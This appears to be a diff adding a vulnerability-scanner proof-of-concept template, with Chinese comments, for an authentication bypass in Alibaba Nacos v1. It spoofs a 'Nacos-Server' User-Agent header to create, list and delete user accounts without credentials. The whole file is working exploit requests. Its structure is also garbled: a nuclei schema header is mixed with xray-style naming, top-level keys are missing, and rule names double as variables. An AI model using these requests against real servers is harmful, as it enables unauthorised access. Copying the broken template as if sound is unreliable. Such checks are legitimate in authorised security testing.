@@ -1,0 +1,25 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: alibaba-nacos-v1-auth-bypass
+name: poc-yaml-alibaba-nacos-v1-auth-bypass
+            # 增加了 bypass 的方式
+            path: /nacos/v1/auth/users/?username={{r1}}&password={{r2}}
+            headers:
+                User-Agent: Nacos-Server
+        expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /nacos/v1/auth/users/?pageNo=1&pageSize=999
+            headers:
+                User-Agent: Nacos-Server
+        expression: response.status == 200 && response.body.bcontains(bytes(r1))
+    r2:
+        request:
+            cache: true
+            method: DELETE
+            path: /nacos/v1/auth/users/?username={{r1}}
+            headers:
+                User-Agent: Nacos-Server
+        # 不需要判断这个条件
+        expression: "true"
